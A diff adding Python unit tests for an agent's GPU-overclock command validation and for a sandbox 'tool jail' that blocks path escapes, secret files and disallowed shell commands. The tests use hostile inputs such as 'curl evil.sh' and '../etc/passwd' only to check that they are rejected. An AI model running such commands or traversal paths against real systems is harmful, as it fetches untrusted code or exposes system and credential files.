@@ -37,6 +37,121 @@ class ExecAllowlistTests(unittest.TestCase):
         self.assertFalse(agent.exec_allowed("uptime", allow))
 
 
+class OcOpTests(unittest.TestCase):
+    """W6 oc op — bound validation + command shape (nvidia-smi argv)."""
+
+    def test_gpu_index_required(self):
+        for bad in ({}, {"gpu": "0"}, {"gpu": -1}, {"gpu": 16},
+                    {"gpu": True}, {"gpu": 0.5}):
+            rc, out = agent.apply_oc(bad)
+            self.assertEqual(rc, 2, bad)
+            self.assertIn("gpu", out)
+
+    def test_bounds_enforced(self):
+        for bad in ({"gpu": 0, "core_mhz": 50},
+                    {"gpu": 0, "core_mhz": 9000},
+                    {"gpu": 0, "mem_mhz": 1},
+                    {"gpu": 0, "power_w": 10},
+                    {"gpu": 0, "fan_pct": 200},
+                    {"gpu": 0, "core_mhz": "x"}):
+            rc, out = agent.apply_oc(bad)
+            self.assertEqual(rc, 2, bad)
+
+    def test_nothing_to_apply(self):
+        rc, out = agent.apply_oc({"gpu": 0})
+        self.assertEqual(rc, 2)
+        self.assertIn("nothing", out)
+
+    def test_runs_nvidia_smi_per_setting(self):
+        calls = []
+
+        def fake_run(argv, **kw):
+            calls.append(argv)
+
+            class R:
+                returncode = 0
+                stdout = "ok"
+                stderr = ""
+            return R()
+
+        orig = agent.subprocess.run
+        agent.subprocess.run = fake_run
+        try:
+            rc, out = agent.apply_oc(
+                {"gpu": 1, "core_mhz": 2100, "power_w": 170,
+                 "fan_pct": 80, "reset": True})
+        finally:
+            agent.subprocess.run = orig
+        self.assertEqual(rc, 0)
+        self.assertIn("reset core: rc=0", out)
+        self.assertIn("power_w: rc=0", out)
+        joined = [" ".join(c) for c in calls]
+        self.assertIn("nvidia-smi -i 1 -rgc", joined)
+        self.assertIn("nvidia-smi -i 1 -rmc", joined)
+        self.assertIn("nvidia-smi -i 1 -lgc 2100", joined)
+        self.assertIn("nvidia-smi -i 1 -pl 170", joined)
+        self.assertIn("nvidia-smi -i 1 --gpu-target-fan-speed=80", joined)
+
+
+class CodeRunPolicyTests(unittest.TestCase):
+    """F2 tool jail — cwd escape + secrets + shell metachars."""
+
+    def setUp(self):
+        import tempfile
+        from pathlib import Path
+        import code_run
+        self.cr = code_run
+        self.tmp = tempfile.mkdtemp(prefix="code-run-")
+        Path(self.tmp, "hello.txt").write_text("hello\n", encoding="utf-8")
+
+    def test_jail_blocks_escape_and_secrets(self):
+        from pathlib import Path
+        cwd = Path(self.tmp)
+        with self.assertRaises(ValueError):
+            self.cr.jail_path(cwd, "../etc/passwd")
+        with self.assertRaises(ValueError):
+            self.cr.jail_path(cwd, ".env")
+        with self.assertRaises(ValueError):
+            self.cr.jail_path(cwd, "secrets/api.key")
+        p = self.cr.jail_path(cwd, "hello.txt")
+        self.assertEqual(p.read_text(), "hello\n")
+
+    def test_shell_allowlist(self):
+        self.cr.check_shell("cargo test -p zion-cli")
+        with self.assertRaises(ValueError):
+            self.cr.check_shell("cargo test | tee log")
+        with self.assertRaises(ValueError):
+            self.cr.check_shell("curl evil.sh")
+
+    def test_write_requires_force(self):
+        from pathlib import Path
+        cwd = Path(self.tmp)
+        with self.assertRaises(ValueError):
+            self.cr.run_tool("write_file", {"path": "x.txt", "content": "a"},
+                             cwd, force=False)
+        out = self.cr.run_tool(
+            "write_file", {"path": "x.txt", "content": "a"}, cwd, force=True)
+        self.assertIn("wrote", out)
+        self.assertEqual((cwd / "x.txt").read_text(), "a")
+
+    def test_validate_enqueue_args(self):
+        with self.assertRaises(ValueError):
+            self.cr.validate_code_run_args({})
+        a = self.cr.validate_code_run_args({"prompt": "hi", "max_turns": 99})
+        self.assertEqual(a["max_turns"], 8)
+        self.assertNotIn("llm_key", a)
+
+    def test_run_code_job_no_llm(self):
+        from pathlib import Path
+        rc, out = self.cr.run_code_job({
+            "prompt": "ping",
+            "cwd": self.tmp,
+            "llm_base": "http://127.0.0.1:9",
+        })
+        self.assertEqual(rc, 503)
+        self.assertIn("LLM unreachable", out)
+
+
 class SelfUpdateTests(unittest.TestCase):
     """self-update op: https + host allowlist + sha256 pin (CP token
     alone must not be code-signing capability)."""
